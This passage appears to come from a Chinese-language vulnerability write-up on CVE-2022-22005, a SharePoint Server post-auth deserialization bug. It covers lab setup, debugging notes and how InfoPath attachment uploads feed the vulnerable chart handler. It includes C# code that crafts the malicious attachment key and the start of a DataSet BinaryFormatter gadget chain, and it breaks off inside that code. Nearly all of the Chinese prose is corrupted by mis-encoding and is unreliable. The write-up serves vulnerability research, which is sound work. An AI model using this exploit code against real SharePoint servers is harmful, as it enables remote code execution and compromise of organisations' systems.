Server</code>éœ€è¦æ˜¯ä¼ä¸šç‰ˆï¼Œä¸€å¼€å§‹å¹¶æ²¡æ‰¾åˆ°åœ¨å“ªé‡Œå‡çº§ä¼ä¸šç‰ˆï¼Œå°±é‡è£…äº†ä¸€ä¸ªï¼ˆç®€ç›´æ˜¯æŠ˜ç£¨ï¼‰ï¼Œåé¢å‘ç°åœ¨<code>ç®¡ç†ä¸­å¿ƒ-å‡çº§å’Œè¿ç§»</code>åœ°æ–¹å¯ä»¥ç›´æ¥å‡çº§</li><li>è¾“å…¥<code>SharePoint site</code>çš„åœ°å€æ—¶ï¼Œä¸èƒ½ç”¨<code>IP</code>åœ°å€ï¼Œå¿…é¡»è¦ç”¨åŸŸåï¼ˆè¿™é‡Œä¹Ÿå¡äº†å¥½ä¹…ï¼‰ï¼ˆæˆ‘è¿™é‡Œæ˜¯åœ¨<code>http://sp2019/</code>çš„<code>/</code>ä¸‹åˆ›å»ºäº†ä¸€ä¸ªç½‘ç«™é›†ï¼Œæ‰€ä»¥æ‰æ˜¯ä¸‹å›¾æ ·å­ï¼‰<br><img src="/img/CVE-2022-22005/InfoPath-Designer-SP-site.png" alt="InfoPath Designer SharePoint site"></li><li>è¿™é‡Œç™»å½•æ—¶ï¼Œåªéœ€è¦ç”¨ç”¨æˆ·åå³å¯ï¼Œä¸ç”¨åŠ æ—çš„åå­—ï¼ˆä¾‹å¦‚æˆ‘çš„æ˜¯<code>vangelis</code>ï¼Œä¸èƒ½ç”¨<code>vangelis@sp.com.cn</code>ï¼‰ï¼Œä¹Ÿä¸ç”¨åŠ åŸŸçš„åå­—ï¼ˆä¾‹å¦‚ä¸ç”¨åŠ <code>SP\</code>åœ¨å‰é¢ï¼‰</li><li>æ·»åŠ ä¸€ä¸ª<code>SharePoint List</code>ä¹‹åï¼Œéœ€è¦<code>Publish</code>ï¼Œåœ¨å·¦ä¸Šè§’ï¼Œè¿™ä¸ªåªæ˜¯ä¸Šä¼ ä¸€ä¸ªæ¨¡æ¿ï¼Œå¹¶ä¸æ˜¯åœ¨è¿™é‡Œè¿›è¡Œ<code>attach file</code><br><img src="/img/CVE-2022-22005/InfoPath-Design-SP-List-Publish.png" alt="InfoPath Design SharePoint List Publish"></li></ol><h3 id="SharePoint-Server"><a href="#SharePoint-Server" class="headerlink" title="SharePoint Server"></a>SharePoint Server</h3><p>æœ€å¼€å§‹ç›´æ¥æ‰“å¼€<code>SharePoint List</code>çš„<code>test</code>ï¼Œè¿›è¡Œæ–°å»ºæ—¶ï¼Œæ˜¾ç¤ºå¦‚ä¸‹é¡µé¢</p><p><img src="/img/CVE-2022-22005/SP-State-Service.png" alt="Share Point State Service"></p><p>å°±æ˜¯è¿™ä¸ªæœåŠ¡æ²¡å¼€å¯ï¼Œæˆ‘é…ç½®çš„æ—¶å€™ï¼Œä¹Ÿæ²¡æ‰¾åˆ°åœ°æ–¹å¼€ï¼Œå› æ­¤ç›´æ¥ç”¨ç®¡ç†ä¸­å¿ƒçš„é…ç½®å¯¼å‘ï¼Œ<code>å¯ç”¨æœåŠ¡å™¨åœºé…ç½®å¯¼å‘</code>ï¼Œåœ¨é»˜è®¤é…ç½®çš„æ—¶å€™è¿›è¡Œ<code>State Service</code>çš„å¼€å¯</p><p>æ³¨ï¼šæˆ‘è¿™é‡Œå¹¶æœªå¼€å¯è‡ªåŠ©åˆ›å»ºç«™ç‚¹<code>Self-Service Site Creation</code>çš„ç‰¹æ€§ï¼Œè·Ÿ<a href="https://www.starlabs.sg/blog/2022/05-new-wine-in-old-bottle-microsoft-sharepoint-post-auth-deserialization-rce-cve-2022-29108/">cve-2022-29108</a>ï¼Œä¸å¤ªä¸€è‡´</p><h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>è°ƒè¯•ç¯å¢ƒï¼Œæˆ‘æœ€å¼€å§‹ç”¨çš„<code>Visual Studio 2022</code>è¿›è¡Œè°ƒè¯•ï¼Œä½†æ˜¯è¿™ä¸ªè°ƒè¯•ï¼Œå¹¶ä¸èƒ½è·Ÿåˆ°<code>BinaryFormatter.Deserialize()</code>çš„å†…éƒ¨å®ç°ï¼Œæœ€åå‘ç°è¿˜æ˜¯2020å¹´å°±ä¸å†æ›´æ–°çš„<code>dnSpy</code>è¿˜æ˜¯æœ€å¥½ç”¨çš„<br>ä½¿ç”¨ï¼Œ<code>attach</code>çš„è¿›ç¨‹æ˜¯<code>w3wp.exe</code>ï¼ˆé€‰æ‹©å…¶ä¸­ç«¯å£å¼€åœ¨<code>80</code>çš„ï¼‰ï¼Œæˆ‘è°ƒè¯•æ—¶çš„<code>w3wp.exe</code>çš„<code>Command Line</code>å¦‚ä¸‹</p><pre><code class="hljs powershell">c:\windows\system32\inetsrv\w3wp.exe <span class="hljs-literal">-ap</span> <span class="hljs-string">&quot;SharePoint - 80&quot;</span> <span class="hljs-literal">-v</span> <span class="hljs-string">&quot;v4.0&quot;</span> <span class="hljs-literal">-l</span> <span class="hljs-string">&quot;webengine4.dll&quot;</span> <span class="hljs-literal">-a</span> \\.\pipe\iisipm564fe27d<span class="hljs-literal">-58a0</span><span class="hljs-literal">-4dbf</span><span class="hljs-literal">-ba0b</span><span class="hljs-literal">-dfa28df62bb2</span> <span class="hljs-literal">-h</span> <span class="hljs-string">&quot;C:\inetpub\temp\apppools\SharePoint - 80\SharePoint - 80.config&quot;</span> <span class="hljs-literal">-w</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-literal">-m</span> <span class="hljs-number">0</span></code></pre><p>åœ¨<code>attach</code>è¿›ç¨‹ä¹‹åï¼Œè¦ç‚¹<code>å…¨éƒ¨ä¸­æ–­</code>ä¹‹åå¯¹äºåŠ è½½çš„<code>æ¨¡å—</code>è¿›è¡ŒæŸ¥çœ‹æ ¸å¿ƒçš„<code>dll</code>ï¼Œå¯¹å…¶è¿›è¡Œåç¼–è¯‘ï¼Œç„¶åä¸‹æ–­ç‚¹</p><h2 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h2><p>2022å¹´01æœˆçš„<code>Microsoft.Office.Server.Chart.dll</code>ä¸­çš„<code>loadChartImage()</code>å¦‚ä¸‹ï¼Œå…¶å¹¶æœªå¯¹äºé€šè¿‡<code>sessionKey</code>è·å–çš„å†…å­˜è¿›è¡Œååºåˆ—åŒ–æ£€æµ‹</p><p><img src="/img/CVE-2022-22005/2022-01-Chart-dll-loadChartImage.png" alt="2022-01 loadChartImage"></p><p>è€Œåœ¨2022å¹´02æœˆçš„<code>Microsoft.Office.Server.Chart.dll</code>ä¸­çš„<code>loadChartImage()</code>ï¼Œè¿›è¡Œäº†ç±»å‹ç»‘å®š</p><p><img src="/img/CVE-2022-22005/2022-02-Chart-dll-loadChartImage.png" alt="2022-02 loadChartImage"></p><h2 id="expæ€è·¯"><a href="#expæ€è·¯" class="headerlink" title="expæ€è·¯"></a>expæ€è·¯</h2><h3 id="sessionKey-æ¥æº"><a href="#sessionKey-æ¥æº" class="headerlink" title="sessionKey æ¥æº"></a>sessionKey æ¥æº</h3><p><code>sessionKey</code>æ˜¯ç”±<code>sk</code>è¿™ä¸ªå‚æ•°è¾“å…¥è€Œæ¥</p><p><img src="/img/CVE-2022-22005/Chart-sessionKey.png" alt="sessionKey"></p><p><code>FetchBinaryDaTa</code>ä¸»è¦æ˜¯è§£æ<code>key</code>ï¼Œç„¶åä»æ•°æ®åº“ä¸­è·å–<code>statekey</code>å¯¹åº”çš„å†…å®¹</p><pre><code class="hljs C"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> byte[] FetchBinaryData(<span class="hljs-built_in">string</span> key)&#123;    StateKey key2 = StateKey.ParseKey(key);    <span class="hljs-keyword">return</span> StateManager.Current.PeekState(key2);&#125;</code></pre><p>å…¶ä¸­<code>g</code>æ˜¯æ•°æ®åº“çš„<code>id</code>ï¼Œè€Œ<code>g2</code>æ˜¯æ•°æ®åº“ä¸­éœ€è¦å–å¾—å†…å®¹çš„<code>key</code></p><p><img src="/img/CVE-2022-22005/ParseKey.png" alt="ParseKey"></p><p>é¡ºç€è¿™ä¸ªæ€è·¯å¾ˆå®¹æ˜“æƒ³åˆ°ï¼Œåº”è¯¥æƒ³åŠæ³•æŠŠä¸€ä¸ªå¯ä»¥å¯¼è‡´ååºåˆ—åŒ–æ”»å‡»çš„å†…å®¹å­˜å‚¨åˆ°æ•°æ®åº“ä¸­</p><p>æ ¹æ® <a href="https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint">ZDI cve-2021-27076</a> çš„é‡æ’­æ”»å‡»ï¼Œå¯ä»¥çŸ¥é“é€šè¿‡<code>InfoPath</code>é™„ä»¶ä¸Šä¼ çš„æ–¹å¼ï¼Œå¯ä»¥ä½¿å¾—é™„ä»¶çš„å†…å®¹å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œä»è€Œæœ€åä¼ æ’­åˆ°ååºåˆ—æ¼æ´çš„ä½ç½®</p><p>åœ¨æ­¤é¡ºä¾¿è®°å½•ä¸€ä¸‹<code>cve-2022-29108</code>çš„ä¼ å‚ï¼Œå…¶<code>pk</code>å’Œ<code>ok</code>ä¼šæ‹¼æ¥è¾¾åˆ°ä¹‹å‰çš„<code>sessionKey</code>çš„æ•ˆæœï¼Œ<code>ot</code>éœ€è¦è®¾ç½®ä¸º<code>chart</code>ï¼Œ<code>csk</code>è·Ÿ<code>sk</code>ä¸€è‡´</p><p><img src="/img/CVE-2022-22005/Chart-CustomSessionStateKey.png" alt="Chart-CustomSessionStateKey"></p><h3 id="InfoPath-é™„ä»¶ä¸Šä¼ "><a href="#InfoPath-é™„ä»¶ä¸Šä¼ " class="headerlink" title="InfoPath é™„ä»¶ä¸Šä¼ "></a>InfoPath é™„ä»¶ä¸Šä¼ </h3><h4 id="æ€»æµç¨‹ç®€ä»‹"><a href="#æ€»æµç¨‹ç®€ä»‹" class="headerlink" title="æ€»æµç¨‹ç®€ä»‹"></a>æ€»æµç¨‹ç®€ä»‹</h4><p>å…¶ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼ˆå€Ÿç”¨äº† <a href="https://www.starlabs.sg/blog/2022/05-new-wine-in-old-bottle-microsoft-sharepoint-post-auth-deserialization-rce-cve-2022-29108/">cve-2022-29108</a> çš„å›¾ï¼‰</p><p><img src="/img/CVE-2022-22005/InfoPath-UploadFile.png" alt="InfoPath-UploadFile"></p><p>æœ€ç»ˆå¾—åˆ°çš„<code>attachment id</code>æ‰æ˜¯æˆ‘ä»¬éœ€è¦çš„<code>key</code></p><h4 id="ç»†èŠ‚"><a href="#ç»†èŠ‚" class="headerlink" title="ç»†èŠ‚"></a>ç»†èŠ‚</h4><h5 id="newifs-aspx"><a href="#newifs-aspx" class="headerlink" title="newifs.aspx"></a>newifs.aspx</h5><p>é¦–å…ˆåœ¨<code>SharePoint Server</code>é€šè¿‡<code>InfoPath</code>åˆ›å»ºä¸€ä¸ª<code>SharePoint List</code>ï¼Œç„¶ååœ¨<code>SharePoint List</code>ä¸­<code>æ–°å»º</code>ï¼Œä¸Šä¼ ä¸€ä¸ªé™„ä»¶ï¼Œå¹¶é©»ç•™åœ¨æ­¤å¤„</p><p><img src="/img/CVE-2022-22005/1-1-attachFile.png" alt="attachFile"></p><p>åœ¨<code>Burpsuite</code>åå°æŠ“åŒ…æ—¶ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¯¹äº<code>newifs.apx</code>çš„<code>POST</code>è¯·æ±‚çš„åŒ…ï¼ˆå½“ç„¶ï¼Œåœ¨è¿™ä¸ª<code>POST</code>è¯·æ±‚ä¹‹å‰ä¹Ÿæœ‰ä¸ª<code>GET</code>è¯·æ±‚çš„åŒ…ï¼Œåœ¨å°è¯•å†™è„šæœ¬çš„è‡ªåŠ¨åŒ–åˆ©ç”¨æ—¶ï¼Œå‘ç°<code>POST</code>è¯·æ±‚çš„å¤§éƒ¨åˆ†çš„å†…å®¹å‡æ¥æºè‡ªè¿™ä¸ª<code>GET</code>è¯·æ±‚çš„<code>RESPONSE</code>ï¼‰ï¼Œè¿™ä¸ª<code>POST</code>åŒ…ä¸­å­˜åœ¨ä¸¤ä¸ªé‡è¦çš„å€¼ï¼Œä¸€ä¸ªæ˜¯<code>_InfoPath_CanaryValue</code>ï¼ˆåœ¨<code>POST</code>åŒ…ä¸­ï¼‰ï¼Œä¸€ä¸ªæ˜¯<code>DBguid1_guid2</code>ï¼ˆç§°å…¶ä¸º<code>itemId</code>ï¼‰ï¼ˆåœ¨<code>RESPONSE</code>åŒ…ä¸­ï¼Œé€šè¿‡ä¸Šä¼ çš„æ–‡ä»¶åå¯ä»¥æœåˆ°ï¼‰</p><p><img src="/img/CVE-2022-22005/1-2-newifs-getItemId.png" alt="newifs"></p><p>è¿™ä¸ªåŠ¨ä½œå¯¹åº”çš„æ˜¯<code>Microsoft.Office.InfoPath.Server.dll</code></p><pre><code class="hljs haskell"><span class="hljs-title">namespace</span> <span class="hljs-type">Microsoft</span>.<span class="hljs-type">Office</span>.<span class="hljs-type">InfoPath</span>.<span class="hljs-type">Server</span>.<span class="hljs-type">DocumentLifetime</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">Document</span></span><span class="hljs-class">internal static <span class="hljs-type">Document</span> <span class="hljs-type">LoadFromSession</span>(<span class="hljs-type">HttpContext</span> <span class="hljs-title">context</span>, <span class="hljs-type">SPSite</span> <span class="hljs-title">contextSite</span>, <span class="hljs-type">EventLogStart</span> <span class="hljs-title">eventLogStart</span>, <span class="hljs-type">Solution</span> <span class="hljs-title">solution</span>)</span></code></pre><p>åœ¨è°ƒè¯•<code>LoadFromSession</code>æ—¶ï¼Œå¯ä»¥çœ‹åˆ°å…¶<code>document</code>å¯¹è±¡çš„<code>EditingSessionId</code>å°±æ˜¯è¯·æ±‚çš„è¿”å›ä¸­çš„<code>itemId</code></p><hr><p>æ³¨</p><p>è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘äº§ç”Ÿäº†ä¸€ä¸ªæ–‡ä»¶è¿™ä¸ª<code>itemId</code>ä¸èƒ½ç›´æ¥ç”¨åœ¨<code>key</code>çš„é‚£ä¸ªååºåˆ—åŒ–æ¼æ´ä¸Šå—ï¼Ÿæˆ‘å°†è¿™ä¸ªä¼ å…¥<code>sk</code>ï¼Œå‘ç°å…¶å–å‡ºæ¥çš„å†…å­˜å¦‚ä¸‹ï¼Œè¿™ä¸ª<code>itemId</code>åªæ˜¯é‚£ä¸ªä¸Šä¼ æ–‡ä»¶å¯¹åº”åŠ¨ä½œçš„ä¸€äº›è®°å½•ï¼Œå¹¶ä¸æ˜¯å¯¹åº”é‚£ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶ä¸”å¯ä»¥æ³¨æ„åˆ°è¿™ä¸ª<code>itemId</code>å­˜å‚¨çš„ä¸œè¥¿é‡Œé¢æœ€å<code>0x20c7a602c3c</code>çš„ä½ç½®å­˜åœ¨ä¸€ä¸ª<code>stateKey</code>ï¼Œè¿™ä¸ªå°±æ˜¯ä¸Šä¼ æ–‡ä»¶çš„<code>StateKey</code></p><p><img src="/img/CVE-2022-22005/itemId-MemoryBuffer.png" alt="itemId-MemoryBuffer"></p><p>åŒæ ·ä¹Ÿå¯ä»¥åœ¨<code>Microsoft.Office.Server.dll</code>ä¸­ä¸‹æ–­ç‚¹</p><pre><code class="hljs fsharp"><span class="hljs-keyword">namespace</span> Microsoft.Office.Server.Administration<span class="hljs-keyword">internal</span> sealed <span class="hljs-keyword">class</span> StateKey<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> StateKey GenerateKey()</code></pre><p>å¯ä»¥çœ‹åˆ°é¦–å…ˆåœ¨<code>SharePoint List</code>ç”Ÿæˆçš„é¡µé¢<code>test</code>ä¸­ç‚¹æ–°å»ºæ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ª<code>Document</code>å¯¹è±¡ï¼Œå¹¶ç”Ÿæˆå…¶å¯¹åº”çš„<code>StateKey</code>ï¼Œè¿™ä¸ª<code>StateKey</code>å…¶å®å°±æ˜¯<code>itemId</code>ï¼Œå…¶è°ƒç”¨è·¯å¾„æ˜¯ä»<code>Microsoft.office.InfoPath.Server.DocumentLifetime.Document.GetNewEditingSessionId()</code>è€Œæ¥</p><p><img src="/img/CVE-2022-22005/Document-GenerateKey.png" alt="Document-GenerateKey"></p><p>åœ¨<code>attachFile</code>ä¹‹åï¼ŒåŒæ ·ä¼šæ–­åˆ°<code>GenerateKey()</code>ï¼Œå…¶è°ƒç”¨è·¯å¾„æ˜¯ä»<code>Microsoft.Office.InfoPath.Server.DocumentLifetime.EventShartePointFileAttachmentAdd()</code>è€Œæ¥ï¼Œæœ€ç»ˆä¼šå­˜åˆ°<code>doc.ChildStateKeys</code>ä¸­ï¼Œæˆ‘ä»¬åç»­ä¹Ÿæ˜¯ä¸ºäº†æŠŠè¿™ä¸ª<code>ChildStateKeys</code>ä¸­çš„æ–‡ä»¶çš„<code>StateKey</code>ç»™è·å–å‡ºæ¥</p><p><img src="/img/CVE-2022-22005/Document-ChildStateKeys.png" alt="Document-ChildStateKeys"></p><hr><h5 id="formserverattachments-aspx"><a href="#formserverattachments-aspx" class="headerlink" title="formserverattachments.aspx"></a>formserverattachments.aspx</h5><p>ç„¶åï¼Œä»–ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªæ–‡ä»¶ä¸‹è½½çš„æ¥å£ï¼Œåœ¨è¿™ä¸ªæ¥å£ä¸­ä¼ å…¥è¿™ä¸ª<code>itemId</code>çš„å€¼ï¼Œå¯ä»¥æœ€ç»ˆå¾—åˆ°æ­¤<code>Document</code>é‡Œé¢æ‰€æœ‰å†…å®¹ï¼ŒåŒæ ·å¯ä»¥å¾—åˆ°è¿™ä¸ªé‡Œé¢çš„<code>ChildStateKeys</code>é‡Œé¢çš„å€¼ï¼Œæ„Ÿè§‰æŒ‰ç…§æ­£å¸¸åŠŸèƒ½è€Œè¨€ï¼Œåº”è¯¥ä¼ å…¥ä¸€ä¸ªä¸Šä¼ çš„æ–‡ä»¶çš„<code>StateKey</code>ï¼Œå¾—åˆ°è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œè¿™é‡Œç”¨äº†é‡æ’­çš„æ”»å‡»æ–¹å¼<code>a replay-style attack</code></p><p>è¿™ä¸ªå¯¹åº”çš„æ¥å£æ˜¯<code>FormServerAttachments.aspx</code>ï¼Œå¯¹åº”æ˜¯<code>Microsoft.Office.InfoPath.Server.dll</code></p><pre><code class="hljs arduino"><span class="hljs-keyword">namespace</span> Microsoft.Office.InfoPath.<span class="hljs-built_in">Server</span>.Controls<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FormServerAttachments</span></span><span class="hljs-class"><span class="hljs-title">protected</span> <span class="hljs-title">internal</span> <span class="hljs-title">override</span> <span class="hljs-title">void</span> <span class="hljs-title">ProcessRequestInternal</span>(<span class="hljs-title">HttpContext</span> <span class="hljs-title">context</span>)</span></code></pre><p>ï¼ˆP.S è¿™é‡Œçš„<code>public class FormServerAttachments : ProcessRequestPageBase, IHttpHandler, IRequiresCultureInfo</code>ï¼Œå­ç±»ç»§æ‰¿<code>IHttpHandler</code>å’Œ<code>ProcessRequestInternal</code>æ–¹æ³•çš„ç»§æ‰¿å‡æ˜¯å¾ˆæ ‡å‡†çš„<code>ASP.NET</code>å¤„ç†<code>GET/POST</code>è¯·æ±‚çš„å†™æ³•ï¼‰</p><p>åœ¨<code>FileDownload</code>æ¥å£ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªå…³å¿ƒçš„å‚æ•°<code>fid</code>ã€<code>sid</code>ã€<code>key</code>ã€<code>dl</code></p><p><img src="/img/CVE-2022-22005/FormServerAttachments-FileDownload.png" alt="FormServerAttachments FileDownload"></p><ul><li><p>å¯¹äº<code>fid</code>åŸºæœ¬æ²¡è¦æ±‚ï¼Œåªè¦æ±‚éç©ºï¼Œå°†å…¶è®¾ç½®ä¸º<code>1</code>å³å¯</p></li><li><p>å¯¹äº<code>sid</code>ï¼Œåœ¨<code>VerifyCanaryFromCookie</code>ä¸­å¯ä»¥çœ‹åˆ°æ˜¯æŸ¥è¯¢<code>_InfoPath_CanaryValue</code>æ˜¯å¦æ­£ç¡®ï¼Œåœ¨å¯¹<code>newifs.aspx</code>è¿›è¡Œ<code>POST</code>çš„æ—¶å€™å¯ä»¥çœ‹åˆ°<code>_InfoPath_CanaryValue</code>åè·Ÿçš„å€¼</p></li></ul><p><img src="/img/CVE-2022-22005/Canary-VerifyCanaryFromCookie.png" alt="Canary VerifyCanaryFromCookie"></p><ul><li>å¯¹äº<code>key</code>è¦æ±‚æ¯”è¾ƒå¤š<ul><li>é¦–å…ˆåœ¨32è¡Œï¼Œé€šè¿‡<code>DeserializeObjectsFromString</code>è¿›è¡Œ<code>base64</code>è§£ç </li><li>å†åœ¨34è¡Œï¼Œé€šè¿‡<code>Base64DataItem</code>è¿›è¡Œï¼Œè·å–<code>_state</code>ï¼ˆç±»å‹ä¸º<code>Base64ItemState</code>ï¼‰ã€<code>_sessionDataType</code>ï¼ˆç±»å‹ä¸º<code>DataTypeInSessionState</code>ï¼‰ã€<code>_itemId</code>ï¼ˆç±»å‹ä¸º<code>Base64SerializationId</code>ï¼‰</li><li>ç„¶ååœ¨36è¡Œï¼Œé€šè¿‡<code>DocumentChildState.StateInfo.Deserialize</code>è·å–<code>_serializeKey</code>ï¼ˆç±»å‹ä¸º<code>String</code>ï¼‰ã€<code>_size</code>ï¼ˆç±»å‹ä¸º<code>int</code>ï¼‰ã€<code>_version</code>ï¼ˆç±»å‹ä¸º<code>int</code>ï¼‰<ul><li>åœ¨<code>EnsureData</code>ä¸­ï¼Œå¯çŸ¥<code>_state</code>åº”ä¸º<code>Base64ItemState.DelayLoad</code>ï¼ˆæšä¸¾ç±»å‹ï¼Œå€¼ä¸º4ï¼‰</li><li>åœ¨<code>SetSessionData</code>ä¸­ï¼Œå¯çŸ¥<code>_sessionDataType</code>åº”ä¸º<code>Base64DataStorage.Base64DataItem.DataTypeInSessionState.ByteArray</code>ï¼ˆæšä¸¾ç±»å‹ï¼Œå€¼ä¸º2ï¼‰</li><li><code>_serializeKey</code>åº”è¯¥ä¸º<code>Document</code>çš„<code>editingSessionId</code></li><li>å…¶ä½™å¹¶æ— è¦æ±‚</li></ul></li></ul></li></ul><p><img src="/img/CVE-2022-22005/Base64DataItem.png" alt="Base64DataItem"><br><img src="/img/CVE-2022-22005/DocumentChildState-Deserialize.png" alt="DocumentChildState-Deserialize"><br><img src="/img/CVE-2022-22005/EnsureData-SetSessionData.png" alt="EnsureData-SetSessionData"></p><ul><li>å¯¹äº<code>dl</code>ï¼Œåœ¨ç¬¬11è¡Œå’Œç¬¬51è¡Œï¼Œè¦æ±‚å…¶å€¼åº”è¯¥ä¸º<code>ip</code>æ‰èƒ½èµ°åˆ°<code>FileAttachment.ReadInfoFromStream</code>ï¼Œè¿™æ ·æ‰èƒ½æŠŠå–å‡ºæ¥çš„<code>dataAsBytes</code>ä½œä¸ºæ–‡ä»¶é™„ä»¶ä¸‹è½½ä¸‹æ¥</li></ul><pre><code class="hljs java">using System.IO;using System.Text;using System.Runtime.Serialization.Formatters.Binary;using ConsoleApp1;internal <span class="hljs-keyword">enum</span> Base64ItemState&#123;    NoChange,    Updated,    Removed,    New,    DelayLoad&#125;internal <span class="hljs-keyword">enum</span> DataTypeInSessionState&#123;    Unknown,    Utf8String,    ByteArray&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Program</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> string <span class="hljs-title">Base64Encode</span><span class="hljs-params">(string plainText)</span></span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">var</span> plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);        <span class="hljs-keyword">return</span> System.Convert.ToBase64String(plainTextBytes);    &#125;    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">// 4</span>        Base64ItemState _state = Base64ItemState.DelayLoad;        <span class="hljs-comment">// 2</span>        DataTypeInSessionState _sessionDataType = DataTypeInSessionState.ByteArray;        <span class="hljs-comment">// _itermId : writer.Write(this.+_id.ToString)</span>        String _itemId = <span class="hljs-string">&quot;ce21726d-43ff-41a3-9204-981a19e75827&quot;</span>;        String _serializedKey = <span class="hljs-string">&quot;47b652a1843a427d9528e8ebe3f858d3_129790e9056046b2b93cf003c1788d6a&quot;</span>;        <span class="hljs-keyword">int</span> _size = <span class="hljs-number">1024</span>;        <span class="hljs-keyword">int</span> _version = <span class="hljs-number">69</span>;                MemoryStream memStream = <span class="hljs-keyword">new</span> MemoryStream();        <span class="hljs-comment">// using (BinaryWriter writer = new BinaryWriter(File.Open(&quot;createKey.txt&quot;, FileMode.Create)))</span>        using (BinaryWriter writer = <span class="hljs-keyword">new</span> BinaryWriter(memStream))        &#123;            writer.Write7BitEncodedInt((<span class="hljs-keyword">byte</span>)_state);            writer.Write7BitEncodedInt((<span class="hljs-keyword">byte</span>)_sessionDataType);            writer.Write(_itemId);            writer.Write(_serializedKey);            writer.Write7BitEncodedInt(_size);            writer.Write7BitEncodedInt(_version);        &#125;        Console.WriteLine(Convert.ToBase64String(memStream.ToArray()));        Console.WriteLine(<span class="hljs-string">&quot;Success&quot;</span>);    &#125;&#125;</code></pre><h2 id="BinaryFormatter-ååºåˆ—åŒ–çš„åˆ©ç”¨"><a href="#BinaryFormatter-ååºåˆ—åŒ–çš„åˆ©ç”¨" class="headerlink" title="BinaryFormatter ååºåˆ—åŒ–çš„åˆ©ç”¨"></a>BinaryFormatter ååºåˆ—åŒ–çš„åˆ©ç”¨</h2><p>ä¸€å¼€å§‹ç”¨çš„<a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>ä¸­<code>BinaryFormatter</code>çš„<code>DataSet</code>POPé“¾ï¼Œä½†æ˜¯ä¸€ç›´ä¸èƒ½å¼¹è®¡ç®—å™¨ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œé‡æ­äº†æŒºå¤šæ¬¡ç¯å¢ƒï¼Œä»¥åŠå°è¯•å®‰è£…è¡¥ä¸çš„ï¼Œæœ€åè¿˜æ˜¯æ·±å…¥äº†è§£äº†<code>DataSet</code>POPé“¾ä»¥åŠå®šä½åˆ°å‡ºé”™åŸå› ï¼ŒæŸ¥è¯¢èµ„æ–™ï¼Œæœ€åæ‰åœ¨<a href="https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html">mr_me çš„ CVE-2020-1147</a>æ‰¾åˆ°äº†ç­”æ¡ˆ</p><p>åœ¨æ­¤åŒæ—¶è®°å½•ä¸€ä¸‹<code>DataSet</code>çš„POPé“¾çš„æ„é€ </p><h3 id="DataSet-çš„POPé“¾"><a href="#DataSet-çš„POPé“¾" class="headerlink" title="DataSet çš„POPé“¾"></a>DataSet çš„POPé“¾</h3><p>å€Ÿç”¨<a href="https://xz.aliyun.com/t/9593#toc-1">å…ˆçŸ¥ä¸€ç¯‡DataSetçš„åˆ†æ</a></p><pre><code class="hljs java">[Serializable]public class DataSetMarshal : ISerializable&#123;    <span class="hljs-keyword">byte</span>[] _fakeTable;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">GetObjectData</span><span class="hljs-params">(SerializationInfo info, StreamingContext context)</span></span><span class="hljs-function">    </span>&#123;        info.SetType(typeof(System.Data.DataSet));        info.AddValue(<span class="hljs-string">&quot;DataSet.RemotingFormat&quot;</span>, System.Data.SerializationFormat.Binary);        info.AddValue(<span class="hljs-string">&quot;DataSet.DataSetName&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);        info.AddValue(<span class="hljs-string">&quot;DataSet.Namespace&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);        info.AddValue(<span class="hljs-string">&quot;DataSet.Prefix&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);        info.AddValue(<span class="hljs-string">&quot;DataSet.CaseSensitive&quot;</span>, <span class="hljs-keyword">false</span>);        info.AddValue(<span class="hljs-string">&quot;DataSet.LocaleLCID&quot;</span>, <span class="hljs-number">0x409</span>);        info.AddValue(<span class="hljs-string">&quot;DataSet.EnforceConstraints&quot;</span>, <span class="hljs-keyword">false</span>);        info.AddValue(<span class="hljs-string">&quot;DataSet.ExtendedProperties&quot;</span>, (System.Data.PropertyCollection)<span class="hljs-keyword">null</span>);        info.AddValue(<span class="hljs-string">&quot;DataSet.Tables.Count&quot;</span>, <span class="hljs-number">1</span>);        info.AddValue(<span class="hljs-string">&quot;DataSet.Tables_0&quot;</span>, _fakeTable);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SetFakeTable</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bfPayload)</span></span><span class="hljs-function">    </span>&#123;        _fakeTable = bfPayload;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DataSetMarshal</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bfPayload)</span></span><span class="hljs-function">    </span>&#123;        SetFakeTable(bfPayload);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span 